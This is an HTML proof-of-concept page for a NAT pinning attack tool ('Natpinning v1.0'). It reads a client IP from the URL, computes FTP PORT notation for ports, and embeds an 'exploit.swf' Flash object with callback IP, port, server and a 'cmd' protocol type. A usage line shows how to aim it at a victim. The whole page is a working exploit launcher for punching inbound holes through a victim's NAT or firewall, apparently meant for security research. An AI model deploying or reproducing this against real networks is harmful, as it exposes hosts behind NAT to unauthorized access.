<html>
	<head>
		<title>Natpin POC</title>
	</head>
	<body>
		<script>
			function getParameter(paramName) {
  				var searchString = window.location.search.substring(1),i, val, params = searchString.split("&");
				for (i=0;i<params.length;i++) {
    					val = params[i].split("=");
			    			if (val[0] == paramName) {
      							return unescape(val[1]);
		    				}
  					}
				return "";
			}
			function dot2num(dot) {
				var d = dot.split('.');
				return ((((((+d[0])*256)+(+d[1]))*256)+(+d[2]))*256)+(+d[3]);
			}
			function ftpCalcPortNotation(port){
				x = port%256
				y = (port -x)/256
				return y+","+x
			}

		</script>
 			<center><b>Natpinning v1.0 - http://www.gremwell.com</b></center>
		<br>
		<br>For more information on NATPinning or usage of this tool please visit <a href="http://github.com/allodoxaphobia/natpinning/wiki" target="_blank">http://github.com/allodoxaphobia/natpinning/wiki</a>.
		<br>

		<script>
			var createSwfObject = function(src, attributes, parameters) {
  				var i, html, div, obj, attr = attributes || {}, param = parameters || {};
  				attr.type = 'application/x-shockwave-flash';
  				if (window.ActiveXObject) {
    					attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
    					param.movie = src;
  				}
	  			else {
	    				attr.data = src;
	  			}
				html = '<object';
	  				for (i in attr) {
	   					html += ' ' + i + '="' + attr[i] + '"';
	  				}
	  			html += '>';
	  			for (i in param) {
	    				html += '<param name="' + i + '" value="' + param[i] + '" />';
	  				}
	  			html += '</object>';
	  			div = document.createElement('div');
	  			div.innerHTML = html;
	  			obj = div.firstChild;
	  			div.removeChild(obj);
	  			return obj;
				};
				if (getParameter("ci")==""){
					document.write("Usage: http://server/exploit.html?ci=ip_of_client");
				}else{
					var proto = "cmd";
					var server = document.location.hostname//defaulting to same host
					var callbackip = ""
					var callbackport = ""
					callbackip = getParameter("ci");
					//where dragons be
					var swfEl = createSwfObject('exploit.swf', {id: 'myid', 'class': 'myclass', width: 750, height: 550}, {wmode: 'transparent',allowScriptAccess: 'allways', FlashVars : 'ci='+ callbackip + '&cp='+callbackport+'&server='+ server + '&type='+proto});
					document.body.appendChild(swfEl);
				}
		</script>
	</body>
</html>
